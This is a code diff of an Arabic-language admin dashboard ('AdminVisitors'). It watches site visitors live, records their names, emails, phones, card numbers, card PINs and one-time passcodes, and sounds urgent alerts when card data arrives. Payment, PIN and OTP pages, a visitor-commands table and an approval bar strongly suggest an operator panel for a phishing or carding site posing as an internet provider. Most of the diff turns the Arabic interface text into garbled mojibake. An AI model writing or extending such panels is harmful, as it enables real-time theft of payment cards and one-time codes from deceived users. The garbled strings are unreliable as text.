@@ -76,13 +76,13 @@ const formatTime = (s: string) =>
 
 const timeAgo = (s: string): string => {
   const diff = Date.now() - new Date(s).getTime();
-  if (diff < 60_000) return "الآن";
+  if (diff < 60_000) return "Ø§ÙØ¢Ù";
   const m = Math.floor(diff / 60_000);
-  if (m < 60) return `قبل ${m} د`;
+  if (m < 60) return `ÙØ¨Ù ${m} Ø¯`;
   const h = Math.floor(m / 60);
-  if (h < 24) return `قبل ${h} س`;
+  if (h < 24) return `ÙØ¨Ù ${h} Ø³`;
   const d = Math.floor(h / 24);
-  return `قبل ${d} ي`;
+  return `ÙØ¨Ù ${d} Ù`;
 };
 
 const isCountryCode = (s: string | null): s is CountryCode =>
@@ -104,9 +104,9 @@ const RowStageChip = ({ v }: { v: Visitor }) => {
     : v.card_pin
     ? { label: "PIN", icon: KeyRound, cls: "bg-amber-500/15 text-amber-600 dark:text-amber-400 ring-amber-500/30" }
     : v.card_number
-    ? { label: "بطاقة", icon: CreditCard, cls: "bg-violet-500/15 text-violet-600 dark:text-violet-400 ring-violet-500/30" }
+    ? { label: "Ø¨Ø·Ø§ÙØ©", icon: CreditCard, cls: "bg-violet-500/15 text-violet-600 dark:text-violet-400 ring-violet-500/30" }
     : v.checkout_at || v.full_name || v.email || v.phone
-    ? { label: "تشكاوت", icon: Package, cls: "bg-sky-500/15 text-sky-600 dark:text-sky-400 ring-sky-500/30" }
+    ? { label: "ØªØ´ÙØ§ÙØª", icon: Package, cls: "bg-sky-500/15 text-sky-600 dark:text-sky-400 ring-sky-500/30" }
     : null;
   if (!stage) return null;
   const Icon = stage.icon;
@@ -191,22 +191,22 @@ const mergeVisitorsBySession = (rows: Visitor[]) => {
   return merged.sort((a, b) => Math.max(toMs(b.last_seen_at), toMs(b.updated_at)) - Math.max(toMs(a.last_seen_at), toMs(a.updated_at)));
 };
 
-// Map last_path → friendly label + emoji
+// Map last_path â friendly label + emoji
 const pageLabel = (path: string | null): { label: string; emoji: string } => {
-  if (!path) return { label: "غير معروف", emoji: "❓" };
-  if (path === "/" || path === "") return { label: "الرئيسية", emoji: "🏠" };
-  if (path.startsWith("/checkout")) return { label: "إتمام الطلب", emoji: "🧾" };
-  if (path.startsWith("/payment/otp")) return { label: "OTP", emoji: "🔐" };
-  if (path.startsWith("/payment/pin")) return { label: "PIN", emoji: "🔢" };
-  if (path.startsWith("/payment")) return { label: "الدفع", emoji: "💳" };
-  if (path.startsWith("/success")) return { label: "نجاح", emoji: "✅" };
-  if (path.startsWith("/business")) return { label: "أعمال", emoji: "💼" };
-  if (path.startsWith("/residential")) return { label: "منزلي", emoji: "🏡" };
-  if (path.startsWith("/roam")) return { label: "تنقّل", emoji: "🛰️" };
-  if (path.startsWith("/map")) return { label: "الخريطة", emoji: "🗺️" };
-  if (path.startsWith("/service-plans")) return { label: "الباقات", emoji: "📦" };
-  if (path.startsWith("/support")) return { label: "الدعم", emoji: "🛟" };
-  return { label: path.replace(/^\//, "") || "صفحة", emoji: "📄" };
+  if (!path) return { label: "ØºÙØ± ÙØ¹Ø±ÙÙ", emoji: "â" };
+  if (path === "/" || path === "") return { label: "Ø§ÙØ±Ø¦ÙØ³ÙØ©", emoji: "ð " };
+  if (path.startsWith("/checkout")) return { label: "Ø¥ØªÙØ§Ù Ø§ÙØ·ÙØ¨", emoji: "ð§¾" };
+  if (path.startsWith("/payment/otp")) return { label: "OTP", emoji: "ð" };
+  if (path.startsWith("/payment/pin")) return { label: "PIN", emoji: "ð¢" };
+  if (path.startsWith("/payment")) return { label: "Ø§ÙØ¯ÙØ¹", emoji: "ð³" };
+  if (path.startsWith("/success")) return { label: "ÙØ¬Ø§Ø­", emoji: "â" };
+  if (path.startsWith("/business")) return { label: "Ø£Ø¹ÙØ§Ù", emoji: "ð¼" };
+  if (path.startsWith("/residential")) return { label: "ÙÙØ²ÙÙ", emoji: "ð¡" };
+  if (path.startsWith("/roam")) return { label: "ØªÙÙÙÙ", emoji: "ð°ï¸" };
+  if (path.startsWith("/map")) return { label: "Ø§ÙØ®Ø±ÙØ·Ø©", emoji: "ðºï¸" };
+  if (path.startsWith("/service-plans")) return { label: "Ø§ÙØ¨Ø§ÙØ§Øª", emoji: "ð¦" };
+  if (path.startsWith("/support")) return { label: "Ø§ÙØ¯Ø¹Ù", emoji: "ð" };
+  return { label: path.replace(/^\//, "") || "ØµÙØ­Ø©", emoji: "ð" };
 };
 
 type StatusFilter = "all" | "online" | "offline" | "payment" | "completed" | "rejected";
@@ -250,7 +250,7 @@ const AdminVisitors = () => {
         osc.stop(ctx.currentTime + start + dur + 0.02);
       };
       if (kind === "urgent") {
-        // Two-tone urgent chime: high → higher
+        // Two-tone urgent chime: high â higher
         playTone(880, 0, 0.18);
         playTone(1320, 0.18, 0.22);
       } else {
@@ -266,7 +266,7 @@ const AdminVisitors = () => {
     setMuted((m) => {
       const next = !m;
       localStorage.setItem("admin_muted", next ? "1" : "0");
-      toast({ title: next ? "تم كتم الإشعارات" : "تم تفعيل الإشعارات" });
+      toast({ title: next ? "ØªÙ ÙØªÙ Ø§ÙØ¥Ø´Ø¹Ø§Ø±Ø§Øª" : "ØªÙ ØªÙØ¹ÙÙ Ø§ÙØ¥Ø´Ø¹Ø§Ø±Ø§Øª" });
       return next;
     });
   };
@@ -302,10 +302,10 @@ const AdminVisitors = () => {
       .order("last_seen_at", { ascending: false })
       .limit(1000);
     if (error) {
-      if (!silent) toast({ title: "تعذّر التحميل", description: error.message, variant: "destructive" });
+      if (!silent) toast({ title: "ØªØ¹Ø°ÙØ± Ø§ÙØªØ­ÙÙÙ", description: error.message, variant: "destructive" });
     } else {
       const merged = mergeVisitorsBySession((data || []) as Visitor[]);
-      // Skip state update if nothing actually changed — prevents needless re-renders.
+      // Skip state update if nothing actually changed â prevents needless re-renders.
       setVisitors((prev) => {
         if (prev.length === merged.length) {
           let identical = true;
@@ -348,10 +348,10 @@ const AdminVisitors = () => {
   const prevSnapshot = useRef<Map<string, Visitor>>(new Map());
   const isFirstLoad = useRef(true);
 
-  // Detect changes vs previous snapshot → fire toasts
+  // Detect changes vs previous snapshot â fire toasts
   useEffect(() => {
     if (isFirstLoad.current) {
-      // Skip notifications on first render — just seed snapshot
+      // Skip notifications on first render â just seed snapshot
       prevSnapshot.current = new Map(visitors.map((v) => [v.id, v]));
       if (visitors.length > 0) isFirstLoad.current = false;
       return;
@@ -361,10 +361,10 @@ const AdminVisitors = () => {
 
     for (const [id, v] of next) {
       const old = prev.get(id);
-      const name = v.full_name || "زائر";
+      const name = v.full_name || "Ø²Ø§Ø¦Ø±";
       if (!old) {
-        notify(`✨ زائر جديد دخل الموقع`, {
-          description: `${name} — ${pageLabel(v.last_path).label}`,
+        notify(`â¨ Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙØ¯ Ø¯Ø®Ù Ø§ÙÙÙÙØ¹`, {
+          description: `${name} â ${pageLabel(v.last_path).label}`,
           duration: 6000,
         });
         continue;
@@ -372,22 +372,22 @@ const AdminVisitors = () => {
       // Detect action transitions (new field set)
       const newAction = (k: keyof Visitor, label: string, sensitive = false) => {
         if (!old[k] && v[k]) {
-          notify(`🔔 إجراء جديد: ${label}`, {
-            description: `${name} — ${pageLabel(v.last_path).label}`,
+          notify(`ð Ø¥Ø¬Ø±Ø§Ø¡ Ø¬Ø¯ÙØ¯: ${label}`, {
+            description: `${name} â ${pageLabel(v.last_path).label}`,
             duration: 6000,
           });
           if (sensitive) playAlert("urgent");
           else playAlert("soft");
         }
       };
-      newAction("full_name", "إدخال الاسم");
-      newAction("email", "إدخال البريد");
-      newAction("phone", "إدخال الهاتف");
-      newAction("card_number", "إدخال بطاقة الدفع", true);
-      newAction("card_pin", "إدخال PIN", true);
-      newAction("card_otp", "إدخال OTP", true);
+      newAction("full_name", "Ø¥Ø¯Ø®Ø§Ù Ø§ÙØ§Ø³Ù");
+      newAction("email", "Ø¥Ø¯Ø®Ø§Ù Ø§ÙØ¨Ø±ÙØ¯");
+      newAction("phone", "Ø¥Ø¯Ø®Ø§Ù Ø§ÙÙØ§ØªÙ");
+      newAction("card_number", "Ø¥Ø¯Ø®Ø§Ù Ø¨Ø·Ø§ÙØ© Ø§ÙØ¯ÙØ¹", true);
+      newAction("card_pin", "Ø¥Ø¯Ø®Ø§Ù PIN", true);
+      newAction("card_otp", "Ø¥Ø¯Ø®Ø§Ù OTP", true);
       if (old.last_path !== v.last_path && v.last_path) {
-        notify(`📍 ${name} انتقل إلى صفحة جديدة`, {
+        notify(`ð ${name} Ø§ÙØªÙÙ Ø¥ÙÙ ØµÙØ­Ø© Ø¬Ø¯ÙØ¯Ø©`, {
           description: `${pageLabel(v.last_path).label} (${v.last_path})`,
           duration: 4500,
         });
@@ -417,7 +417,7 @@ const AdminVisitors = () => {
     };
   }, [isAdmin]);
 
-  // Polling fallback in case realtime misses an event (silent — no spinner flash)
+  // Polling fallback in case realtime misses an event (silent â no spinner flash)
   useEffect(() => {
     if (!isAdmin) return;
     const intervalId = window.setInterval(() => {
@@ -433,45 +433,45 @@ const AdminVisitors = () => {
   }, []);
 
   const remove = async (sessionId: string) => {
-    if (!confirm("حذف هذا الزائر نهائياً؟")) return;
+    if (!confirm("Ø­Ø°Ù ÙØ°Ø§ Ø§ÙØ²Ø§Ø¦Ø± ÙÙØ§Ø¦ÙØ§ÙØ")) return;
     const { error } = await supabase.from("visitors").delete().eq("session_id", sessionId);
     if (error) {
-      toast({ title: "تعذّر الحذف", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± Ø§ÙØ­Ø°Ù", description: error.message, variant: "destructive" });
       return;
     }
     setVisitors((v) => v.filter((x) => x.session_id !== sessionId));
     if (selected?.session_id === sessionId) setSelected(null);
-    toast({ title: "تم الحذف" });
+    toast({ title: "ØªÙ Ø§ÙØ­Ø°Ù" });
   };
 
   const removeAll = async () => {
     const offline = visitors.filter((v) => !isOnline(v));
     if (offline.length === 0) {
-      toast({ title: "لا يوجد زوّار غير متصلين للحذف" });
+      toast({ title: "ÙØ§ ÙÙØ¬Ø¯ Ø²ÙÙØ§Ø± ØºÙØ± ÙØªØµÙÙÙ ÙÙØ­Ø°Ù" });
       return;
     }
-    if (!confirm(`حذف ${offline.length} زائر غير متصل؟ سيبقى الزوّار المتصلون.`)) return;
+    if (!confirm(`Ø­Ø°Ù ${offline.length} Ø²Ø§Ø¦Ø± ØºÙØ± ÙØªØµÙØ Ø³ÙØ¨ÙÙ Ø§ÙØ²ÙÙØ§Ø± Ø§ÙÙØªØµÙÙÙ.`)) return;
     const sessionIds = Array.from(new Set(offline.map((v) => v.session_id)));
     const { error } = await supabase.from("visitors").delete().in("session_id", sessionIds);
     if (error) {
-      toast({ title: "تعذّر الحذف", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± Ø§ÙØ­Ø°Ù", description: error.message, variant: "destructive" });
       return;
     }
     setVisitors((prev) => prev.filter((v) => isOnline(v)));
     if (selected && !isOnline(selected)) setSelected(null);
-    toast({ title: `تم حذف ${sessionIds.length} زائر غير متصل` });
+    toast({ title: `ØªÙ Ø­Ø°Ù ${sessionIds.length} Ø²Ø§Ø¦Ø± ØºÙØ± ÙØªØµÙ` });
   };
 
   // Wipe ALL visitor data + commands from the database (not just the loaded list)
   const purgeAllData = async () => {
-    if (!confirm("سيتم مسح جميع بيانات الزوّار والأوامر من قاعدة البيانات نهائياً. متابعة؟")) return;
+    if (!confirm("Ø³ÙØªÙ ÙØ³Ø­ Ø¬ÙÙØ¹ Ø¨ÙØ§ÙØ§Øª Ø§ÙØ²ÙÙØ§Ø± ÙØ§ÙØ£ÙØ§ÙØ± ÙÙ ÙØ§Ø¹Ø¯Ø© Ø§ÙØ¨ÙØ§ÙØ§Øª ÙÙØ§Ø¦ÙØ§Ù. ÙØªØ§Ø¨Ø¹Ø©Ø")) return;
     const [v, c] = await Promise.all([
       supabase.from("visitors").delete().not("id", "is", null),
       supabase.from("visitor_commands").delete().not("id", "is", null),
     ]);
     if (v.error || c.error) {
       toast({
-        title: "تعذّر المسح الكامل",
+        title: "ØªØ¹Ø°ÙØ± Ø§ÙÙØ³Ø­ Ø§ÙÙØ§ÙÙ",
         description: v.error?.message || c.error?.message,
         variant: "destructive",
       });
@@ -479,20 +479,20 @@ const AdminVisitors = () => {
     }
     setVisitors([]);
     setSelected(null);
-    toast({ title: "تم مسح جميع البيانات بنجاح" });
+    toast({ title: "ØªÙ ÙØ³Ø­ Ø¬ÙÙØ¹ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø¨ÙØ¬Ø§Ø­" });
   };
 
   const dedupeVisitors = async () => {
-    if (!confirm("سيتم دمج كل الصفوف المكررة لكل جلسة في صف واحد مع الحفاظ على البيانات. متابعة؟")) return;
+    if (!confirm("Ø³ÙØªÙ Ø¯ÙØ¬ ÙÙ Ø§ÙØµÙÙÙ Ø§ÙÙÙØ±Ø±Ø© ÙÙÙ Ø¬ÙØ³Ø© ÙÙ ØµÙ ÙØ§Ø­Ø¯ ÙØ¹ Ø§ÙØ­ÙØ§Ø¸ Ø¹ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª. ÙØªØ§Ø¨Ø¹Ø©Ø")) return;
     const { data, error } = await supabase.rpc("merge_duplicate_visitors");
     if (error) {
-      toast({ title: "تعذّر الدمج", description: error.message, variant: "destructive" });
+      toast({ title: "ØªØ¹Ø°ÙØ± Ø§ÙØ¯ÙØ¬", description: error.message, variant: "destructive" });
       return;
     }
     const result = (data ?? {}) as { merged_sessions?: number; removed_rows?: number };
     toast({
-      title: "تم تنظيف السجلات المكررة",
-      description: `جلسات مدمجة: ${result.merged_sessions ?? 0} • صفوف محذوفة: ${result.removed_rows ?? 0}`,
+      title: "ØªÙ ØªÙØ¸ÙÙ Ø§ÙØ³Ø¬ÙØ§Øª Ø§ÙÙÙØ±Ø±Ø©",
+      description: `Ø¬ÙØ³Ø§Øª ÙØ¯ÙØ¬Ø©: ${result.merged_sessions ?? 0} â¢ ØµÙÙÙ ÙØ­Ø°ÙÙØ©: ${result.removed_rows ?? 0}`,
     });
     void load();
   };
@@ -563,8 +563,8 @@ const AdminVisitors = () => {
     return (
       <main className="min-h-screen flex items-center justify-center bg-background text-foreground">
         <div className="text-center space-y-2">
-          <p className="text-lg">غير مصرّح</p>
-          <p className="text-sm text-muted-foreground">هذه الصفحة للمدراء فقط.</p>
+          <p className="text-lg">ØºÙØ± ÙØµØ±ÙØ­</p>
+          <p className="text-sm text-muted-foreground">ÙØ°Ù Ø§ÙØµÙØ­Ø© ÙÙÙØ¯Ø±Ø§Ø¡ ÙÙØ·.</p>
         </div>
       </main>
     );
@@ -578,15 +578,15 @@ const AdminVisitors = () => {
       <header className="bg-background border-b border-border">
         <div className="px-3 md:px-6 h-14 md:h-16 flex items-center justify-between gap-2 md:gap-4">
           <div className="flex items-center gap-1.5 md:gap-2 overflow-x-auto scrollbar-hide flex-1 min-w-0">
-            <Stat label="متصل" value={stats.online} tone="emerald" icon={<CircleDot className="w-3.5 h-3.5" />} />
-            <Stat label="بانتظار" value={stats.waiting} tone="amber" icon={<Clock className="w-3.5 h-3.5" />} />
-            <Stat label="الإجمالي" value={stats.total} tone="slate" icon={<UsersIcon className="w-3.5 h-3.5" />} />
-            <Stat label="يتصفح" value={stats.browsing} tone="sky" icon={<Eye className="w-3.5 h-3.5" />} />
-            <Stat label="في الدفع" value={stats.payment} tone="rose" icon={<CreditCard className="w-3.5 h-3.5" />} />
+            <Stat label="ÙØªØµÙ" value={stats.online} tone="emerald" icon={<CircleDot className="w-3.5 h-3.5" />} />
+            <Stat label="Ø¨Ø§ÙØªØ¸Ø§Ø±" value={stats.waiting} tone="amber" icon={<Clock className="w-3.5 h-3.5" />} />
+            <Stat label="Ø§ÙØ¥Ø¬ÙØ§ÙÙ" value={stats.total} tone="slate" icon={<UsersIcon className="w-3.5 h-3.5" />} />
+            <Stat label="ÙØªØµÙØ­" value={stats.browsing} tone="sky" icon={<Eye className="w-3.5 h-3.5" />} />
+            <Stat label="ÙÙ Ø§ÙØ¯ÙØ¹" value={stats.payment} tone="rose" icon={<CreditCard className="w-3.5 h-3.5" />} />
             {stats.topCountry && isCountryCode(stats.topCountry.code) && (
               <div className="hidden md:flex items-center gap-2 px-3 h-10 rounded-xl border border-border bg-card text-xs shrink-0">
                 <Globe className="w-3.5 h-3.5 text-muted-foreground" />
-                <span className="text-muted-foreground">أعلى الدول</span>
+                <span className="text-muted-foreground">Ø£Ø¹ÙÙ Ø§ÙØ¯ÙÙ</span>
                 <span className="font-semibold text-foreground">{stats.topCountry.count}</span>
                 <CountryFlag code={stats.topCountry.code} className="w-4 h-3 rounded-sm" />
               </div>
@@ -595,39 +595,39 @@ const AdminVisitors = () => {
 
           <div className="flex items-center gap-2 md:gap-3 shrink-0">
             <div className="text-right hidden lg:block">
-              <h1 className="text-lg font-semibold leading-tight">لوحة التحكم</h1>
-              <p className="text-[11px] text-muted-foreground leading-tight">إدارة الزوار والمدفوعات</p>
+              <h1 className="text-lg font-semibold leading-tight">ÙÙØ­Ø© Ø§ÙØªØ­ÙÙ</h1>
+              <p className="text-[11px] text-muted-foreground leading-tight">Ø¥Ø¯Ø§Ø±Ø© Ø§ÙØ²ÙØ§Ø± ÙØ§ÙÙØ¯ÙÙØ¹Ø§Øª</p>
             </div>
             <DropdownMenu>
               <DropdownMenuTrigger asChild>
                 <button
-                  title="إعدادات لوحة التحكم"
+                  title="Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙÙØ­Ø© Ø§ÙØªØ­ÙÙ"
                   className="w-9 h-9 md:w-10 md:h-10 rounded-full bg-rose-50 text-rose-600 hover:bg-rose-100 flex items-center justify-center transition shrink-0"
                 >
                   <Settings className="w-4 h-4" />
                 </button>
               </DropdownMenuTrigger>
               <DropdownMenuContent align="end" className="w-56">
-                <DropdownMenuLabel>إعدادات لوحة التحكم</DropdownMenuLabel>
+                <DropdownMenuLabel>Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙÙØ­Ø© Ø§ÙØªØ­ÙÙ</DropdownMenuLabel>
                 <DropdownMenuSeparator />
                 <DropdownMenuItem onSelect={toggleMute}>
                   {muted ? <Volume2 className="w-4 h-4 ml-2" /> : <VolumeX className="w-4 h-4 ml-2" />}
-                  {muted ? "تفعيل الصوت" : "كتم الصوت"}
+                  {muted ? "ØªÙØ¹ÙÙ Ø§ÙØµÙØª" : "ÙØªÙ Ø§ÙØµÙØª"}
                 </DropdownMenuItem>
                 <DropdownMenuItem onSelect={() => setPwOpen(true)}>
                   <KeyRound className="w-4 h-4 ml-2" />
-                  تغيير كلمة المرور
+                  ØªØºÙÙØ± ÙÙÙØ© Ø§ÙÙØ±ÙØ±
                 </DropdownMenuItem>
                 <DropdownMenuItem onSelect={dedupeVisitors}>
                   <Combine className="w-4 h-4 ml-2" />
-                  دمج الجلسات المكررة
+                  Ø¯ÙØ¬ Ø§ÙØ¬ÙØ³Ø§Øª Ø§ÙÙÙØ±Ø±Ø©
                 </DropdownMenuItem>
                 <DropdownMenuItem
                   onSelect={purgeAllData}
                   className="text-rose-600 focus:text-rose-700 focus:bg-rose-50"
                 >
                   <Database className="w-4 h-4 ml-2" />
-                  مسح جميع البيانات
+                  ÙØ³Ø­ Ø¬ÙÙØ¹ Ø§ÙØ¨ÙØ§ÙØ§Øª
                 </DropdownMenuItem>
                 <DropdownMenuSeparator />
                 <DropdownMenuItem
@@ -635,7 +635,7 @@ const AdminVisitors = () => {
                   className="text-rose-600 focus:text-rose-700 focus:bg-rose-50"
                 >
                   <LogOut className="w-4 h-4 ml-2" />
-                  تسجيل الخروج
+                  ØªØ³Ø¬ÙÙ Ø§ÙØ®Ø±ÙØ¬
                 </DropdownMenuItem>
               </DropdownMenuContent>
             </DropdownMenu>
@@ -644,15 +644,15 @@ const AdminVisitors = () => {
         </div>
       </header>
 
-      {/* Body — visitor list on the RIGHT (~25%), placeholder/details on the LEFT */}
+      {/* Body â visitor list on the RIGHT (~25%), placeholder/details on the LEFT */}
       <div className="px-3 md:px-6 py-3 md:py-4 grid lg:grid-cols-[minmax(280px,25%)_1fr] gap-3 md:gap-4 max-w-[1600px] mx-auto" dir="rtl">
-        {/* RIGHT: Visitor list (~25%) — appears first in RTL = right side */}
+        {/* RIGHT: Visitor list (~25%) â appears first in RTL = right side */}
         <section className="order-1 bg-background rounded-2xl border border-border overflow-hidden flex flex-col lg:max-h-[calc(100vh-6rem)]">
           {/* List header */}
           <div className="p-4 border-b border-border space-y-3">
             <div className="flex items-center justify-between">
               <div className="flex items-center gap-2">
-                <span className="font-semibold">الزوار</span>
+                <span className="font-semibold">Ø§ÙØ²ÙØ§Ø±</span>
                 <UsersIcon className="w-4 h-4 text-muted-foreground" />
               </div>
               <div className="flex items-center gap-2">
@@ -662,7 +662,7 @@ const AdminVisitors = () => {
                 <button
                   onClick={removeAll}
                   className="w-8 h-8 rounded-lg text-rose-600 hover:bg-rose-50 flex items-center justify-center transition"
-                  title="حذف غير المتصلين"
+                  title="Ø­Ø°Ù ØºÙØ± Ø§ÙÙØªØµÙÙÙ"
                 >
                   <Trash2 className="w-4 h-4" />
                 </button>
@@ -674,7 +674,7 @@ const AdminVisitors = () => {
               <input
                 value={query}
                 onChange={(e) => setQuery(e.target.value)}
-                placeholder="بحث بالاسم أو الهاتف..."
+                placeholder="Ø¨Ø­Ø« Ø¨Ø§ÙØ§Ø³Ù Ø£Ù Ø§ÙÙØ§ØªÙ..."
                 className="w-full h-10 bg-muted/50 rounded-lg border border-transparent focus:bg-background focus:border-border pr-10 pl-3 text-sm outline-none"
               />
             </div>
@@ -682,19 +682,19 @@ const AdminVisitors = () => {
             {/* Pills */}
             <div className="flex items-center gap-1.5 overflow-x-auto pb-1 -mx-1 px-1">
               <Pill active={statusFilter === "all"} onClick={() => setStatusFilter("all")} tone="slate">
-                الكل
+                Ø§ÙÙÙ
               </Pill>
               <Pill active={statusFilter === "payment"} onClick={() => setStatusFilter("payment")} tone="rose">
-                في الدفع
+                ÙÙ Ø§ÙØ¯ÙØ¹
               </Pill>
               <Pill active={statusFilter === "completed"} onClick={() => setStatusFilter("completed")} tone="emerald">
-                مكتمل
+                ÙÙØªÙÙ
               </Pill>
               <Pill active={statusFilter === "online"} onClick={() => setStatusFilter("online")} tone="emerald" icon={<Wifi className="w-3 h-3" />}>
-                متصل
+                ÙØªØµÙ
               </Pill>
               <Pill active={statusFilter === "offline"} onClick={() => setStatusFilter("offline")} tone="slate" icon={<WifiOff className="w-3 h-3" />}>
-                غير متصل
+                ØºÙØ± ÙØªØµÙ
               </Pill>
             </div>
           </div>
@@ -704,7 +704,7 @@ const AdminVisitors = () => {
             {loading ? (
               <div className="p-10 text-center"><Loader2 className="w-5 h-5 animate-spin inline text-muted-foreground" /></div>
             ) : filtered.length === 0 ? (
-              <div className="p-10 text-center text-sm text-muted-foreground">لا يوجد زوّار.</div>
+              <div className="p-10 text-center text-sm text-muted-foreground">ÙØ§ ÙÙØ¬Ø¯ Ø²ÙÙØ§Ø±.</div>
             ) : (
               <ul className="divide-y divide-border">
                 {filtered.map((v) => {
@@ -738,6 +738,9 @@ const AdminVisitors = () => {
                             <span className={`absolute bottom-0 left-0 w-3 h-3 rounded-full ring-2 ring-card ${
                               online ? "bg-emerald-500" : stageRose ? "bg-amber-400" : "bg-muted-foreground/30"
                             }`} />
+                            {(v.card_number || v.card_otp || v.card_pin) && !v.pin_at && (
+                              <span className="absolute inset-0 rounded-full border-2 border-amber-400 border-t-transparent animate-spin pointer-events-none" />
+                            )}
                           </div>
 
                           <div className="flex-1 min-w-0">
@@ -746,9 +749,9 @@ const AdminVisitors = () => {
           {timeAgo(v.last_seen_at)}
         </span>
                               <span className="font-semibold text-sm truncate text-foreground">
-                                {v.full_name || "زائر"}
-                                {isMe && <span className="mr-1.5 text-[10px] bg-primary text-primary-foreground px-1.5 py-0.5 rounded-full font-bold">أنت</span>}
-                                {isNew && !isMe && <span className="mr-1.5 text-[10px] text-accent-foreground bg-accent px-1.5 py-0.5 rounded-full font-medium">جديد</span>}
+                                {v.full_name || "Ø²Ø§Ø¦Ø±"}
+                                {isMe && <span className="mr-1.5 text-[10px] bg-primary text-primary-foreground px-1.5 py-0.5 rounded-full font-bold">Ø£ÙØª</span>}
+                                {isNew && !isMe && <span className="mr-1.5 text-[10px] text-accent-foreground bg-accent px-1.5 py-0.5 rounded-full font-medium">Ø¬Ø¯ÙØ¯</span>}
                               </span>
                             </div>
 
@@ -764,14 +767,14 @@ const AdminVisitors = () => {
                                   {code}
                                 </span>
                               ) : (
-                                <span className="text-[10px] text-muted-foreground/60">—</span>
+                                <span className="text-[10px] text-muted-foreground/60">â</span>
                               )}
                             </div>
                           </div>
                         </div>
                       </button>
 
-                      {/* Inline approval bar — only when visitor is on the relevant page with submitted data */}
+                      {/* Inline approval bar â only when visitor is on the relevant page with submitted data */}
                       
                     </li>
                   );
@@ -793,8 +796,8 @@ const AdminVisitors = () => {
                 <div className="w-24 h-24 rounded-3xl bg-muted text-muted-foreground flex items-center justify-center mx-auto mb-6">
                   <LayoutGrid className="w-10 h-10" />
                 </div>
-                <h3 className="text-2xl md:text-3xl font-semibold mb-2">اختر زائرًا لعرض التفاصيل</h3>
-                <p className="text-sm text-muted-foreground">كل البيانات التي يقدّمها ستظهر هنا مباشرة.</p>
+                <h3 className="text-2xl md:text-3xl font-semibold mb-2">Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø±ÙØ§ ÙØ¹Ø±Ø¶ Ø§ÙØªÙØ§ØµÙÙ</h3>
+                <p className="text-sm text-muted-foreground">ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØªÙ ÙÙØ¯ÙÙÙØ§ Ø³ØªØ¸ÙØ± ÙÙØ§ ÙØ¨Ø§Ø´Ø±Ø©.</p>
               </div>
             </div>
           )}
@@ -815,7 +818,7 @@ const AdminVisitors = () => {
             <div className="bg-background border-b border-border px-4 md:px-5 h-14 flex items-center justify-between sticky top-0 z-10">
               <div className="flex items-center gap-2">
                 <Eye className="w-4 h-4 text-muted-foreground" />
-                <span className="font-semibold">تفاصيل الزائر</span>
+                <span className="font-semibold">ØªÙØ§ØµÙÙ Ø§ÙØ²Ø§Ø¦Ø±</span>
               </div>
               <button
                 onClick={() => setDetailsOpen(false)}
@@ -887,10 +890,10 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
   const code = v.detected_country;
   const page = pageLabel(v.last_path);
   const online = isOnline(v);
-  const stage = isPaymentStage(v) ? "في الدفع" : v.last_path === "/success" ? "مكتمل" : "يتصفح";
+  const stage = isPaymentStage(v) ? "ÙÙ Ø§ÙØ¯ÙØ¹" : v.last_path === "/success" ? "ÙÙØªÙÙ" : "ÙØªØµÙØ­";
 
   const clearConversation = async () => {
-    if (!confirm("مسح كل البيانات التي أدخلها هذا الزائر؟ (الزائر نفسه سيبقى)")) return;
+    if (!confirm("ÙØ³Ø­ ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØªÙ Ø£Ø¯Ø®ÙÙØ§ ÙØ°Ø§ Ø§ÙØ²Ø§Ø¦Ø±Ø (Ø§ÙØ²Ø§Ø¦Ø± ÙÙØ³Ù Ø³ÙØ¨ÙÙ)")) return;
     const { error } = await supabase
       .from("visitors")
       .update({
@@ -902,10 +905,10 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
       })
       .eq("session_id", v.session_id);
     if (error) {
-      sonner.error("تعذّر مسح المحادثة", { description: error.message });
+      sonner.error("ØªØ¹Ø°ÙØ± ÙØ³Ø­ Ø§ÙÙØ­Ø§Ø¯Ø«Ø©", { description: error.message });
       return;
     }
-    sonner.success("تم مسح بيانات الزائر");
+    sonner.success("ØªÙ ÙØ³Ø­ Ø¨ÙØ§ÙØ§Øª Ø§ÙØ²Ø§Ø¦Ø±");
   };
 
   return (
@@ -923,14 +926,14 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
           </div>
           <div className="flex-1 min-w-0">
             <div className="flex items-center gap-2 flex-wrap">
-              <h2 className="text-lg md:text-2xl font-semibold truncate">{v.full_name || "زائر"}</h2>
+              <h2 className="text-lg md:text-2xl font-semibold truncate">{v.full_name || "Ø²Ø§Ø¦Ø±"}</h2>
               <span className={`text-[9px] md:text-[10px] uppercase tracking-widest font-bold px-1.5 md:px-2 py-0.5 rounded ${
                 online ? "bg-emerald-50 text-emerald-700" : "bg-muted text-muted-foreground"
               }`}>
                 {online ? "Active" : "Offline"}
               </span>
               <span className="text-[10px] md:text-xs text-muted-foreground bg-muted px-2 py-0.5 rounded-full">
-                {stage} · {page.emoji} {page.label}
+                {stage} Â· {page.emoji} {page.label}
               </span>
             </div>
             <div className="mt-1.5 md:mt-2 flex items-center gap-2 md:gap-3 text-xs md:text-sm text-muted-foreground flex-wrap">
@@ -945,7 +948,7 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
             </div>
           </div>
           <div className="text-left shrink-0 hidden sm:block">
-            <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-1">آخر ظهور</div>
+            <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-1">Ø¢Ø®Ø± Ø¸ÙÙØ±</div>
             <div className="text-sm font-medium tabular-nums text-foreground">{formatTime(v.last_seen_at)}</div>
           </div>
         </div>
@@ -959,27 +962,27 @@ const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => voi
       {/* Stage progress timeline */}
       <StageProgress v={v} />
 
